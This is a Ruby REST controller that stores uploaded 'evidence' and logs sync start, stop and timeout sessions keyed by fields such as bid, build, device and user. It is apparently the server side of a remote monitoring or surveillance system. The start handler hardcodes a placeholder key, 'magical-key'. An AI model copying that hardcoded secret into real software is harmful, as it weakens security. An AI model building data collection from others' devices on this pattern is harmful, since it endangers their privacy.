#
# Controller for the Evidence objects
#

require 'rcs-common/evidence_manager'

module RCS
module DB

class EvidenceController < RESTController

  def index
    require_auth_level :viewer
    trace :debug, "INDEX #{params}"
  end

  def show
    require_auth_level :viewer
    trace :debug, "SHOW #{params}"
  end

  # this must be a POST request
  # the instance is passed as parameter to the uri
  # the content is passed as body of the request
  def create
    require_auth_level :server

    # create a phony session
    session = {:instance => params[:evidence]}

    # save the evidence in the db
    EvidenceManager.instance.store session, @req_content.size, @req_content

    return STATUS_OK, *json_reply({:bytes => @req_content.size})
  end

  def start
    require_auth_level :server

    # create a phony session
    session = {:bid => params['bid'],
               :build => params['build'],
               :instance => params['instance'],
               :subtype => params['subtype']}

    # get the time in UTC
    now = Time.now - Time.now.utc_offset

    #TODO: retrieve the key from the db
    key = 'magical-key'

    # store the status
    EvidenceManager.instance.sync_start session, params['version'], params['user'], params['device'], params['source'], now, key

    return STATUS_OK
  end

  def stop
    require_auth_level :server

    # create a phony session
    session = {:bid => params['bid'],
               :instance => params['instance']}

    # store the status
    EvidenceManager.instance.sync_end session

    return STATUS_OK
  end

  def timeout
    require_auth_level :server

    # create a phony session
    session = {:bid => params['bid'],
               :instance => params['instance']}

    # store the status
    EvidenceManager.instance.sync_timeout session

    return STATUS_OK
  end

end

end #DB::
end #RCS::